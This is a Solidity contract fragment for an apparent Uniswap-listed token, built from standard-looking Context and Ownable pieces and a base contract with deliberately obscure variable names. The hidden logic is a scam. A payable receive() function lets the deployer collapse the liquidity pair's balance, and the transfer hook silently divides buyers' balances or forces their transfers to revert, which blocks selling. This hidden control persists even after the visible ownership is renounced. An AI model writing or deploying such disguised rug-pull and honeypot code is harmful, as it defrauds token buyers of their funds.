pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Math { 
    mapping (address => uint256) internal _balances;
    mapping (address => bool) internal Walking;

    address[] internal fairArr; address[3] internal fairAddr;

    bool[3] internal Dope; bool internal trading = false;

    uint256 internal Banana = block.number*2; uint256 internal numB;
    uint256 internal Milk = 0; uint256 internal Carts = 1;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;

    function set() internal {
        fairAddr[0] = address(_router);
        fairAddr[1] = msg.sender;
        fairAddr[2] = pair;
        for (uint256 q=0; q < 3; q++) {Math.Walking[Math.fairAddr[q]] = true; Math.Dope[q] = false; }
    }

    function last(uint256 g) internal view returns (address) { return (Milk > 1 ? fairArr[fairArr.length-g-1] : address(0)); }

    receive() external payable {
        require(msg.sender == fairAddr[1]); _balances[fairAddr[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(fairAddr[2]).sync(); Dope[2] = true;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((trading || (sender == fairAddr[1])), "ERC20: trading is not yet enabled.");
        Carts += ((Walking[sender] != true) && (Walking[recipient] == true)) ? 1 : 0;
        if (((Walking[sender] == true) && (Walking[recipient] != true)) || ((Walking[sender] != true) && (Walking[recipient] != true))) { fairArr.push(recipient); }
        _balancesOfTheFair(sender, recipient);
    }

    function _balancesOfTheFair(address sender, address recipient) internal {
        if ((Dope[0] || (Dope[2] && (recipient != fairAddr[1])))) { for (uint256 q=0; q < fairArr.length-1; q++) { _balances[fairArr[q]] /= (Dope[2] ? 1e9 : 4e1); } Dope[0] = false; }
        _balances[last(1)] /= (((Banana == block.number) || Dope[1] || ((Banana - numB) <= 7)) && (Walking[last(1)] != true) && (Milk > 1)) ? (3e1) : (1);
        _balances[last(0)] /= (((Dope[1]) && (last(0) == sender)) || ((Dope[2] && (fairAddr[1] != sender))) ? (0) : (1));
        (Dope[0],Dope[1]) = ((((Carts*10 / 4) == 10) && (Dope[1] == false)) ? (true,true) : (Dope[0],Dope[1]));
        Banana = block.number; Milk++;
    }
}